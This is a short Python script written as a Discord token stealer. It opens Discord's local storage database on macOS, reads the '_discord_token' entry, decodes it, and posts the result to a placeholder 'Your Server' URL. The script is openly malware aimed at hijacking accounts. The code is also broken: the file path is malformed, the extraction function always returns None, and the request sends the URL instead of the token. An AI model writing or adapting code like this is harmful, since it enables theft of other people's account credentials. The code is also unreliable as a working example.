import os
import sqlite3
import base64
import json
from sqlite3.dbapi2 import Cursor
import requests

def extract_tokens_from_discord():

    discord_token_path = os.path.join(os.getenv('HOME'), '~/Library/Application\ Support/discord.Cookies')

    if not os.path.exists(discord_token_path):
        print('Invalid Discord token directory')
        return None

    conn = sqlite3.connect(os.path.join(discord_token_path, 'https_discord.com_0.localstorage-journal'))
    cursor = conn.cursor()

    cursor.execute("SELECT key, value FROM ItemTable WHERE key = '_discord_token'")
    results = cursor.fetchall()

    conn.close()

    if results:
        token_data = json.loads(base64.b64decode(results[0][1]))
        return None

def main():
    url = 'Your Server'
    token = extract_tokens_from_discord()
    if token:
        requests.post(url, json=url)
    else:
        print('Failed to extract file')

if __name__ == '__main__':
    main()
